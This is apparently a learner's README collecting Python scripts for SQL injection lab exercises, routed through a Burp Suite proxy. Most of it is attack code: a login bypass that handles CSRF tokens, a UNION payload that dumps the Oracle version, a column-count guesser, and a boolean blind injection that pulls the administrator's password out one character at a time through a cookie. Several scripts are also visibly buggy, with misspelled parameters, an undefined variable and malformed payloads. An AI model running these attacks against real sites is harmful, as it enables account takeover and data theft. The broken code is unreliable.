# SQL Injection Labs Repository

This repository contains Python scripts for various SQL injection labs I am working on while learning SQL injection techniques using Burp Suite. Each lab has its own script, and this README will be updated as I progress through the labs.

# Labs Overview

## Lab 1: Basic SQL Injection

- **Description**: This lab demonstrates a basic SQL injection attack by exploiting a vulnerable URL parameter.
- **Script**: `sql_injection1.py`
- **Status**: Completed

```bash

python3 script.py <url> <payload>

import requests
import sys 
import urllib

proxies={'http':"http://127.0.0.1:8080",'https':"https://127.0.0.1:8080"}

def exploit_sql(url,payload):
    uri="/filter?category="
    r=requests.get(url+uri+payload,verify=False,proxies=proxies)
    if "cat grin" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url=sys.argv[1].strip() 
        payload=sys.argv[2].strip()
    except IndexError:
        print("usage is not correct ")
    if exploit_sql(url,payload):
        print(" the sql injection is complete")
    else:
        print("there is error in the sql injection") 
```

## Lab 2: SQL Injection with CSRF Token

- **Description**: This lab demonstrates SQL injection while handling CSRF tokens. It retrieves the CSRF token from the webpage and uses it to attempt a login with an SQL payload.
- **Script**: `sql_injection2.py`
- **Status**: Completed

```bash

python3 python3 labX_script.py <url> <sql_payload>

import sys
import requests
import urllib3
from bs4 import BeautifulSoup 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies= {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

def get_csrf_token(s,url):
    res = s.get(url,verify=False,proxies=proxies)
    soup = BeautifulSoup(res.text,'html.parser')
    csrf=soup.find("input")["value"]
    return csrf

def exploit_sqli(s,url,payload):
    csrf=get_csrf_token(s,url)
    data={"csrf":csrf,"username":payload,"password":"12345678"}
    r=s.post(url,data=data,verify=False,proxies=proxies)
    ras=r.text
    if "log out" in ras:
        return True
    else:
        return False


if __name__== "__main__":
    try:
        url=sys.argv[1].strip()
        sqli_payload=sys.argv[2].strip()
    except IndexError:
        print("use the below bash command on your terminal")
        print("use python3 file.py <url> <sql payload>")
    s=requests.Session()
    if exploit_sqli(s,url,payload):
        print("the sql injetion is successful we have logged in")
    else:
        print("the sql injection is not successful we are not logged in")

```


#### Requirements

- pip install requests beautifulsoup4 urllib3

## Lab 3: SQL Injection with UNION TO IDENTIFY DATA BASE VERSION

- **Description**: This lab demonstrates SQL injection attack against a vulnerable web application to retrieve the version of the Oracle database USING SQL UNION operator.
- **Script**: `sql_injection3.py`
- **Status**: Completed
- **note**: 

    - To use UNION, you must know the number of columns because:
        1. The number and order of the columns must be the same in all queries.
        2. The data types must be compatible.
    - The database is Oracle. In Oracle, after the SELECT statement, the FROM clause must follow when you try to identify the number of columns.

```bash
import sys
import urllib3
import requests
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.INsecureRequestWarning)

proxies={"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

def exploit_sqli_version(url):
    path="/filter?catagory=Gifts"
    sql_payload= "UNION select banner,NULL from v$version--"
    r=requests.get(url+path+sql_payload,verify=False,proxies=proxies)
    res=r.text
    if "oracle database" in res:
        print("the sql injection is succesfull")
        soup=BeautifulSoup(r.text,"html.parser")
        version=soup.find(text=re.compile('^.oracle/sDatabase'))
        print(f"the oracle data base version is {version}")


if __name__=="__main__":
    try:
        url=sys.argv[1].strip()
    except: 
        print("input the url")
        sys.exit()
    if exploit_sqli_version(url):
        print("unable to dump the databsse")
```
## Lab 4: SQL Injection Index Checker

- **Description**: This lab demonstrates SQL injection attack against a vulnerable to test for SQL injection vulnerabilities by checking the index of a specified payload against a given URL.
- **Script**: `sql_injection4.py`
- **Status**: Completed
- **note**: 

    - To use UNION, you must know the number of columns because:
        1. The number and order of the columns must be the same in all queries.(this code help as with this)
```bash
import sys
import requests 
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "https://127.0.0.1:8080"
}

def index_guess(url, payload):
    for i in range(1, 50):
        path = "/filter?category=Gifts"
        r = requests.get(url + path + payload,Verify=False, proxies=proxies)  
        
        if r.status_code == 200 in r.text:
            return i
    return None 

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("Input in this format: <url> <payload>")
        sys.exit(1) 

    num = index_guess(url, payload)  
    if num is not None and num >= 1:    
        print(f"The index number is {num}")  
    else:
        print("There is an error or no index for the SQL.")
```

## after this most of the lab are uses the same method.we gone skip to Blind sql injection

## Lab 11: Blind sql injection for Password Exploitation Script

- **Description**: The script leverages a Boolean-based SQL injection technique to determine the length of the administrator's password and subsequently extract it character by character. This type of SQL injection relies on altering SQL queries to return true or false based on the input, thereby revealing information about the database structure or data.
- **Script**: `sql_injection5.py`
- **Status**: Completed

```bash

import urllib.parse
import requests
import urllib3
import urllib
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies= {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

def len_password(url):
    n=0
    payload=f"'(select 'a' from users where username='administrator' and LEN(password)>={n}))"
    payload_encoded=urllib.parse.quote(payload)
    cookies={"tarackid":"gwQNMaBG6YlAsRN0"+payload_encoded,"session":"xVejDqtVc8ibqWPo83lY76b2LOATzhDN"}
    for i in range(1,50):
        ra=requests.get(url,cookies=cookies,verify=False,proxies=proxies)
        if ('welcome' in ra.text):
            n+=1
        else:
            return n
    return n

def exploit_password(url,num_password):
    password=[]
    for i in range(1,num_password+1):
        for j in range(32,126):
            payload=f"' select SUBSTRING(password,{i},1) from users where username='administrator')='ascii({j})"
            payload_encoded=urllib.parse.quote(payload)
            cookies={"tarackid":"gwQNMaBG6YlAsRN0"+payload_encoded,'session':"xVejDqtVc8ibqWPo83lY76b2LOATzhDN"}
            ra=requests.get(url,cookies=cookies,verify=False,proxies=proxies)
            if 'welcome' in ra.text:
                password.append(chr(j))
                break
    print(f"the password fo the administrator user is :{''.join(password)}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("use file.py <url> ")
        sys.exit(1)
    url = sys.argv[1]
    print("- you start bruet false the password")
    trackID="gwQNMaBG6YlAsRN0"
    num_password=len_password(url)
    exploit_password(url,num_password)

```

# Disclaimer

- These scripts are intended for educational purposes only. Use them responsibly and only on applications you own or have explicit permission to test.